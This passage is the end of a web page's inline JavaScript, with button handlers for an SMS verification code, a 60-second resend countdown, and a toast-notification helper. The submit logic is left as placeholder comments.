            startCountdown("subSendSmsBtn", 60);
            showToast("Verification code sent");
          });

        // Submit button click handlers
        securitySubmitBtn.addEventListener("click", function () {
          if (this.classList.contains("active")) {
            showToast("Verification successful");
            // Add your submission logic here
          }
        });

        subSecuritySubmitBtn.addEventListener("click", function () {
          if (this.classList.contains("active")) {
            showToast("Verification successful");
            // Add your submission logic here
          }
        });
      });

      // Toast message function
      function showToast(message) {
        const toast = document.getElementById("toast");
        toast.innerText = message;
        toast.classList.remove("hidden");
        toast.classList.add("show");

        setTimeout(() => {
          toast.classList.remove("show");
          toast.classList.add("hidden");
        }, 3000); // Hide after 3 seconds
      }

      // Countdown function for verification buttons
      function startCountdown(buttonId, duration) {
        const button = document.getElementById(buttonId);
        let seconds = duration;
        button.disabled = true;

        const originalText = button.innerText;
        button.innerText = `${seconds}s`;

        const countdown = setInterval(() => {
          seconds--;
          button.innerText = `${seconds}s`;

          if (seconds <= 0) {
            clearInterval(countdown);
            button.disabled = false;
            button.innerText = originalText;
          }
        }, 1000);
      }
    </script>
  </body>
</html>